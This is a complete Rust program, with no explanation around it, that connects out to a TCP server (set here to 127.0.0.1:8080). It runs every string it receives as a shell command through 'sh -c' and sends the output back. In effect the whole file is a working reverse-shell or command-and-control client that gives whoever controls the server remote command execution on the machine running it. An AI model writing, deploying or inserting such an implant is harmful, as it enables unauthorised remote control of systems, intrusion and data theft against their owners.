use std::net::TcpStream;
use std::io::{Read, Write};
use std::process::Command;
use std::thread;
use std::time::Duration;

fn handle_request(request: &str) -> Result<Vec<u8>, String> {
    let cmd_output = Command::new("sh")
        .arg("-c")
        .arg(request.trim())
        .output()
        .map_err(|err| format!("Failed to execute command: {}", err))?;

    Ok(cmd_output.stdout)
}

fn handle_client(mut stream: TcpStream) -> Result<(), String> {
    let mut buffer: [u8; 1024] = [0; 1024];

    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                println!("Server disconnected");
                break;
            }
            Ok(bytes_read) => {
                let request = String::from_utf8_lossy(&buffer[..bytes_read]).trim().to_string();
                if !request.is_empty() {
                    println!("Received request: {}", request);

                    let output_bytes = handle_request(&request)?;

                    stream.write_all(&output_bytes)
                        .map_err(|err| format!("Failed to write to stream: {}", err))?;
                }
            }
            Err(err) => {
                eprintln!("Error reading from stream: {}", err);
                break;
            }
        }

        // Sleep for a short duration to avoid high CPU usage
        thread::sleep(Duration::from_secs(5));
    }

    Ok(())
}

fn main() {
    match TcpStream::connect("127.0.0.1:8080") {
        Ok(stream) => {
            if let Err(err) = handle_client(stream) {
                eprintln!("Error handling client: {}", err);
            }
        }
        Err(err) => {
            eprintln!("Failed to connect to server: {}", err);
        }
    }
}
